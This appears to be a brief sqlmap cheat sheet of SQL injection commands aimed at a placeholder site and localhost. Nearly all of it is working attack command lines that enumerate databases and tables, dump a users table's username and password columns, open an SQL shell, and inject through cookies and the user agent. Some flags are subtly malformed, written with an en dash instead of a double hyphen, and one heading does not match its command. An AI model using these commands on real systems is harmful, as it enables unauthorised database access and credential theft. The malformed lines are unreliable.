# Cheat Sheet

**Easy Scanning option**
<pre>sqlmap -u "http://testsite.com/login.php"</pre>

**List all databases at the site**
<pre>sqlmap -u "http://testsite.com/login.php" --dbs</pre>

**List all tables in a specific database**
<pre>sqlmap -u "http://testsite.com/login.php" -D site_db --tables</pre>

**List all columns in a table**
<pre>sqlmap -u "http://testsite.com/login.php" -D site_db -T users –dump</pre>

**Dump only selected columns**
<pre>sqlmap -u "http://testsite.com/login.php" -D site_db -T users -C username,password --dump
</pre>

**Dump a table from a database when you have admin credentials**
<pre>sqlmap -u "http://testsite.com/login.php" –method "POST" –data "username=admin&password=admin&submit=Submit" -D social_mccodes -T users –dump
</pre>

**Add Technique**
<pre>sqlmap -u "http://testsite.com/home.php?id=" --dbs --technique=U -p "id"</pre>

**Get SQL Shell**
<pre>sqlmap --dbms=mysql -u "http://testsite.com/login.php" --sql-shell </pre>

**Cookie Injection**
<pre>sqlmap --cookie="user_id=1" -u "http://localhost/index.php" -p "user_id" --level 3 </pre>

**User Agent Injection**
<pre>sqlmap  -u "http://localhost/index.php" --level 3 </pre>

# Switches

**--user-agent**

**--referer**

**--headers**

**--technique= U | B | E**